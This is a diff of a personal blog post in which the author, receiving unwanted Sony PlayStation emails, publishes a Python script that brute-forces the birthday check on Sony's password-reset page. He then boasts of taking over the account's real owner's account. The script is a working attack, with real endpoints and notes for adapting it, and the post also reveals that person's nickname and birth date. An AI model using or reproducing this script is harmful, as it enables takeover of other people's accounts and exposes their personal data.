@@ -21,26 +21,95 @@ I don&#8217;t have a Sony PlayStation. But someone nicknamed &#8220;STRONDHA&#82
 
 <!--more-->
 
-[<img src="http://www.alfersoft.com.ar/blog/wp-content/uploads/2015/09/2015-09-13-12.27.56-am-300x220.png" alt="Sony sending unwanted e-mails" width="300" height="220" class="aligncenter size-medium wp-image-771" srcset="http://www.alfersoft.com.ar/blog/wp-content/uploads/2015/09/2015-09-13-12.27.56-am-300x220.png 300w, http://www.alfersoft.com.ar/blog/wp-content/uploads/2015/09/2015-09-13-12.27.56-am-1024x751.png 1024w, http://www.alfersoft.com.ar/blog/wp-content/uploads/2015/09/2015-09-13-12.27.56-am-700x513.png 700w, http://www.alfersoft.com.ar/blog/wp-content/uploads/2015/09/2015-09-13-12.27.56-am-332x243.png 332w" sizes="(max-width: 300px) 100vw, 300px" />](http://www.alfersoft.com.ar/blog/wp-content/uploads/2015/09/2015-09-13-12.27.56-am.png)
+[<img src="{{ site.url }}/images/2015-09-13-12.27.56-am.png" alt="Sony sending unwanted e-mails"/>]({{ site.url }}/images/2015-09-13-12.27.56-am.png)
 
-### Stop it
+## Stop it
 
 My name is too common, and is not the first time I get subscribed to some site I didn&#8217;t ask to. Sometimes, I just click on the &#8220;unsubscribe&#8221; link, or even on &#8220;forgot my password&#8221; and do whatever I need to stop receiving undesired e-mails.
-  
+
 So, I tried the &#8220;forget my password&#8221; trick with Sony, and after some captcha validation, I received an e-mail with a link. The problem is that they required the birthday in order to reset the password, and of course, I don&#8217;t know the birthday of the person that created the account.
 
 Enters python script to try every possible birthday date from 1/1/1960 until today.
-  
-Notes:
-  
-&#8211; You will need to change the base URL to whatever you received in the password reset e-mail from Sony
-  
-&#8211; You might need to change the &#8216;wrong date&#8217; message to match your local language &#8211; mine is in portuguese (just try any date on the browser, and -unless you&#8217;re so lucky to select the actual birth date- copy and paste the error message on the code)
 
-<div class="oembed-gist">
-  <noscript>
-    View the code on <a href="https://gist.github.com/fvicente/75980d0d00d759b06e50">Gist</a>.
-  </noscript>
-</div>
+### Notes
+
+* You will need to change the base URL to whatever you received in the password reset e-mail from Sony
+
+* You might need to change the &#8216;wrong date&#8217; message to match your local language &#8211; mine is in portuguese (just try any date on the browser, and -unless you&#8217;re so lucky to select the actual birth date- copy and paste the error message on the code)
+
+{% highlight python %}
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+import requests
+import urllib
+import urllib2
+import datetime
+import sys
+import time
+
+from HTMLParser import HTMLParser
+
+# create a subclass and override the handler methods
+class MyHTMLParser(HTMLParser):
+    def handle_starttag(self, tag, attrs):
+        attrs_dict = dict(attrs)
+        if tag == "input" and attrs_dict.get('name', '') == "blah_token":
+            setattr(self, "value", attrs_dict.get("value"))
+
+    def handle_endtag(self, tag):
+        pass
+
+    def handle_data(self, data):
+        pass
+
+
+values = {
+    'struts.token.name' : 'blah_token',
+    'blah_token': '',
+    'verifyType': 'dob',
+    'account.dob': '1',
+    'account.mob': '1',
+    'account.yob': '1980',
+}
+
+#
+# IMPORTANT: paste the URL received in the change password e-mail in the url variable, the url looks something like this:
+# https://account.sonyentertainmentnetwork.com/reg/account/validate-forgot-password-token!input.action?token=***some token here***&request_locale=pt_BR&service-entity=np
+#
+url = '*** PASTE URL HERE ***'
+url_post = "https://account.sonyentertainmentnetwork.com/liquid/reg/account/forgot-password-verify-identity.action"
+
+s = requests.session()
+r = s.get(url)
+date = datetime.datetime(1960, 1, 1, 1, 1, 1)
+today = datetime.datetime.today()
+while date < today: 
+    date += datetime.timedelta(days=1)
+    # find token
+    parser = MyHTMLParser()
+    parser.feed(r.text)
+    if not hasattr(parser, "value"):
+        print "!!!!! FOUND %s" % date.isoformat()
+        break
+    val = getattr(parser, "value")
+    print "blah_token = %r" % val
+    values['blah_token'] = val
+    values['account.dob'] = str(date.day)
+    values['account.mob'] = str(date.month)
+    values['account.yob'] = str(date.year)
+    r = s.post(url_post, values)
+    #
+    # IMPORTANT: The message is in portuguese, you will need to change this message to match your language
+    #
+    if u'A data de nascimento inserida é inválida. Verifique a data e tente novamente.' in r.text:
+        print "birthday is not %s" % date.isoformat()
+    else:
+        print "!!!!! FOUND %s" % date.isoformat()
+        break
+    sys.stdout.flush()
+{% endhighlight %}
+
+[See sony.py on gist](https://gist.github.com/fvicente/75980d0d00d759b06e50)
 
 STHRONDHA was born on January 23 of 1983 (or at least that&#8217;s the date he choose when creating his account). So, now I was able to change the password and stop receiving e-mails from Sony. I guess he will need to create a new account now muahahaha.
